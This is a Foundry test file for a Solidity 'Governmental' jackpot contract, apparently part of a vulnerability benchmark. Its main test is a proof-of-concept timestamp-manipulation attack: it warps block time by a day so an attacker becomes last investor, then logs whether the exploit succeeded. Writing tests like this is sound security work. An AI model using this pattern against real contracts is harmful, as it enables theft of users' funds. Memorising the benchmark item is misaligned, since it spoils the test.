// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/governmental_survey.sol";

contract TimeManipulationTest is Test {
    Governmental public governmental;
    address public attacker = address(0x1337);
    address public honestUser = address(0x42);

    function setUp() public {
        // Initialize contract with 2 ether to have enough funds
        governmental = new Governmental{value: 2 ether}();
    }

    function testTimeManipulationAttack() public {
        // Fund honest user
        vm.deal(honestUser, 1 ether);
        
        // Honest user invests first (minimum investment is jackpot/2 = 1 ether)
        vm.prank(honestUser);
        governmental.invest{value: 1 ether}();

        // BEFORE-Trigger: Capture initial state
        address preTriggerLastInvestor = governmental.lastInvestor();
        console.log("--- BEFORE-Trigger State ---");
        console.log("Last Investor:", preTriggerLastInvestor);

        console.log("--- Trigger: Time Warp and Attacker Investment ---");
        // Warp time forward to manipulate timestamp
        uint256 manipulatedTimestamp = block.timestamp + 1 days;
        vm.warp(manipulatedTimestamp);

        // Fund attacker
        vm.deal(attacker, 1 ether);
        
        // Attacker invests with manipulated timestamp
        vm.prank(attacker);
        governmental.invest{value: 1 ether}();

        // AFTER-Trigger: Capture state after attack
        address postTriggerLastInvestor = governmental.lastInvestor();
        console.log("--- AFTER-Trigger State ---");
        console.log("Last Investor:", postTriggerLastInvestor);

        // Vulnerability verdict
        bool stateChanged = (postTriggerLastInvestor != preTriggerLastInvestor);
        bool exploitSuccessful = (postTriggerLastInvestor == attacker);
        
        console.log("State changed:", stateChanged ? "YES" : "NO");
        console.log("Exploit successful:", exploitSuccessful ? "YES" : "NO");
        
        if (stateChanged && exploitSuccessful) {
            console.log("Vulnerability Exists: Time manipulation allowed attacker to become last investor");
        } else {
            console.log("Vulnerability not Exist: Contract state not altered by time manipulation");
        }

        // Maintain original test assertion
        assertEq(governmental.lastInvestor(), attacker);
    }

    // Unchanged normal flow test
    function testNormalInvestmentFlow() public {
        // Fund honest users
        vm.deal(honestUser, 1 ether);
        address honestUser2 = address(0x43);
        vm.deal(honestUser2, 1 ether);

        // Honest user invests first
        vm.prank(honestUser);
        governmental.invest{value: 1 ether}();

        // Small time passes normally
        vm.warp(block.timestamp + 1 hours);

        // Another honest user invests
        vm.prank(honestUser2);
        governmental.invest{value: 1 ether}();

        // Verify normal flow works correctly
        assertEq(governmental.lastInvestor(), honestUser2);
    }
}